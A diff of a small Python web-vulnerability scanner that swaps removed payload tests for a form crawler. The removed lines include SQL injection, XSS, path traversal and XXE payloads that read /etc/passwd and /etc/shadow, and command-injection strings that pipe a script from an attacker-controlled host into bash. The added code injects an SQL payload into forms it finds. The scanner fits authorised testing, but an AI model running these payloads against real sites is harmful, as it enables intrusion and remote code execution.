@@ -1,6 +1,6 @@
 #########################################################################################################################################################################################
 # Basic Python script for possible vulnerabilities in a web application. (Under Construction)
-# python vulnerability_tester.py
+# python vulnerability_tester.py. Note, script require BeautifulSoup Ref:https://beautiful-soup-4.readthedocs.io/en/latest/
 # Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
 # without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
 # to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
@@ -12,154 +12,89 @@
 #########################################################################################################################################################################################
 
 import requests
+from bs4 import BeautifulSoup
 import re
 
-# Function to test for SQL injection vulnerability
-def test_sql_injection(url):
-    payloads = ["' OR 1=1--", "' OR 'a'='a", "' OR 1=1#", "' OR 'a'='a#"]
-    for payload in payloads:
-        response = requests.get(url + payload)
-        if re.search(r"error in your SQL syntax|mysql_fetch_array", response.text, re.IGNORECASE):
-            return True
-    return False
+# Function to crawl the website and discover URLs and forms
+def crawl_website(base_url):
+    discovered_urls = set()
+    discovered_forms = []
 
-# Function to test for XSS vulnerability
-def test_xss(url):
-    payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
-    for payload in payloads:
-        response = requests.get(url + payload)
-        if payload in response.text:
-            return True
-    return False
+    # Recursive function to crawl URLs
+    def crawl(url):
+        response = requests.get(url)
+        discovered_urls.add(url)
 
-# Function to test for insecure deserialization vulnerability
-def test_insecure_deserialization(url):
-    payloads = [
-        "TzoyOToiU3lzdGVtLlRlc3QiOjE6e3M6MToiY29uZmlndXJhdGlvbiI7czoyOiJvYmplY3QiO3M6NDoiYToxOntpOjA7czo2OiJjb2RlIjt9fX0=",
-        "TzoyOToiU3lzdGVtLlRlc3QiOjE6e3M6MToiY29uZmlndXJhdGlvbiI7czoyOiJvYmplY3QiO3M6NDoiYToxOntpOjA7czo2OiJjb2RlIjt9fQ=="
-    ]
-    for payload in payloads:
-        headers = {"Cookie": "data=" + payload}
-        response = requests.get(url, headers=headers)
-        if "ClassLoader" in response.text:
-            return True
-    return False
+        # Parse HTML content
+        soup = BeautifulSoup(response.content, 'html.parser')
 
-# Function to test for directory traversal vulnerability
-def test_directory_traversal(url):
-    payloads = ["../../../../../../etc/passwd", "../../../../../../etc/shadow"]
-    for payload in payloads:
-        response = requests.get(url + payload)
-        if "root:x:0:0" in response.text:
-            return True
-    return False
+        # Discover forms
+        forms = soup.find_all('form')
+        for form in forms:
+            form_details = {
+                'action': form.get('action'),
+                'method': form.get('method'),
+                'fields': []
+            }
+            inputs = form.find_all('input')
+            for input_tag in inputs:
+                field_type = input_tag.get('type')
+                field_name = input_tag.get('name')
+                form_details['fields'].append({'type': field_type, 'name': field_name})
+            discovered_forms.append(form_details)
 
-# Function to test for server-side request forgery (SSRF) vulnerability
-def test_ssrf(url):
-    payloads = ["http://localhost:8080", "http://127.0.0.1:8080"]
-    for payload in payloads:
-        response = requests.get(url + "?url=" + payload)
-        if "localhost" in response.text:
-            return True
-    return False
+        # Recursively crawl links
+        links = soup.find_all('a', href=True)
+        for link in links:
+            href = link['href']
+            if href.startswith(base_url) and href not in discovered_urls:
+                crawl(href)
 
-# Function to test for remote code execution (RCE) vulnerability
-def test_rce(url):
-    payloads = ["echo VULNERABLE", "ping -c 3 attacker-controlled-server.com"]
-    for payload in payloads:
-        response = requests.get(url + "?cmd=" + payload)
-        if "VULNERABLE" in response.text:
-            return True
-    return False
+    crawl(base_url)
+    return discovered_forms
 
-# Function to test for XML external entity (XXE) vulnerability
-def test_xxe(url):
-    payloads = [
-        """<?xml version="1.0" encoding="UTF-8"?>
-           <!DOCTYPE foo [
-               <!ENTITY xxe SYSTEM "file:///etc/passwd">
-           ]>
-           <foo>&xxe;</foo>""",
-        """<?xml version="1.0" encoding="UTF-8"?>
-           <!DOCTYPE foo [
-               <!ENTITY xxe SYSTEM "file:///etc/shadow">
-           ]>
-           <foo>&xxe;</foo>"""
-    ]
-    for payload in payloads:
-        headers = {'Content-Type': 'application/xml'}
-        response = requests.post(url, data=payload, headers=headers)
-        if "root:x:0:0" in response.text:
-            return True
-    return False
+# Function to test form fields for vulnerabilities
+def test_form_fields(forms):
+    for form in forms:
+        action = form['action']
+        method = form['method']
+        form_fields = form['fields']
+        payloads = generate_payloads(form_fields)
+        # Send requests with payloads and analyze responses
+        # Example: send requests to action endpoint with payloads injected into form fields
+        for payload in payloads:
+            # Send request
+            if method == 'GET':
+                response = requests.get(action, params=payload)
+            else:
+                response = requests.post(action, data=payload)
+            # Analyze response for indications of vulnerabilities
+            analyze_response(response)
 
-# Function to test for command injection vulnerability
-def test_command_injection(url):
-    payloads = [
-        "; ls -la",
-        "; cat /etc/passwd",
-        "; curl http://attacker-controlled-server.com/malicious_payload.sh | bash",
-        "; wget http://attacker-controlled-server.com/malicious_payload.sh -O - | bash"
-    ]
-    for payload in payloads:
-        response = requests.get(url + "?ip=" + payload)
-        if "VULNERABLE" in response.text:
-            return True
-    return False
+# Function to generate payloads for form fields
+def generate_payloads(form_fields):
+    # Example: generate SQL injection payloads for text input fields
+    payloads = []
+    for field in form_fields:
+        if field['type'] == 'text':
+            payloads.append({field['name']: "' OR 1=1--"})
+        # Add more payload generation logic for other types of fields and vulnerabilities
+    return payloads
 
-# Function to test for open redirect vulnerability
-def test_open_redirect(url):
-    payloads = ["http://evil.com", "http://example.com/evil"]
-    for payload in payloads:
-        response = requests.get(url + "?redirect=" + payload)
-        if "evil.com" in response.url:
-            return True
-    return False
+# Function to analyze response for indications of vulnerabilities
+def analyze_response(response):
+    if re.search(r"error in your SQL syntax|mysql_fetch_array", response.text, re.IGNORECASE):
+        print("SQL Injection vulnerability found in response:", response.url)
+    if "<script>alert('XSS')</script>" in response.text:
+        print("XSS vulnerability found in response:", response.url)
+    # Add more checks for other vulnerabilities
 
-# Main function to test all vulnerabilities
-def test_vulnerabilities(vulnerabilities, base_url):
-    for vulnerability, endpoint in vulnerabilities.items():
-        url = base_url + endpoint
-        print(f"Testing {vulnerability} at {url}")
-        vulnerabilities_found = []
-
-        if test_sql_injection(url):
-            vulnerabilities_found.append("SQL Injection")
-
-        if test_xss(url):
-            vulnerabilities_found.append("Cross-Site Scripting (XSS)")
-
-        if test_insecure_deserialization(url):
-            vulnerabilities_found.append("Insecure Deserialization")
-
-        if test_directory_traversal(url):
-            vulnerabilities_found.append("Directory Traversal")
-
-        if test_ssrf(url):
-            vulnerabilities_found.append("Server-Side Request Forgery (SSRF)")
-
-        if test_rce(url):
-            vulnerabilities_found.append("Remote Code Execution (RCE)")
-
-        if test_xxe(url):
-            vulnerabilities_found.append("XML External Entity (XXE)")
-
-        if test_command_injection(url):
-            vulnerabilities_found.append("Command Injection")
-
-        if test_open_redirect(url):
-            vulnerabilities_found.append("Open Redirect")
-
-        if vulnerabilities_found:
-            print(f"Vulnerability {vulnerability} may be present: {', '.join(vulnerabilities_found)}")
-        else:
-            print(f"No vulnerabilities found for {vulnerability}")
+# Main function to initiate crawling, form field testing, and reporting
+def main(base_url):
+    discovered_forms = crawl_website(base_url)
+    test_form_fields(discovered_forms)
+    # Log and report results
 
 if __name__ == "__main__":
-    vulnerabilities = {
-        "A01:2021-Broken Access Control": "/example_endpoint1",
-        "A02:2021-Cryptographic Failures": "/example_endpoint2",
-        # Add more vulnerabilities here
-    }
-    base_url = "http://your_base_url"  # Change "http://your_base_url" to your base URL
-    test_vulnerabilities(vulnerabilities, base_url)
+    base_url = "http://example.com"  # Change to the target website's base URL
+    main(base_url)
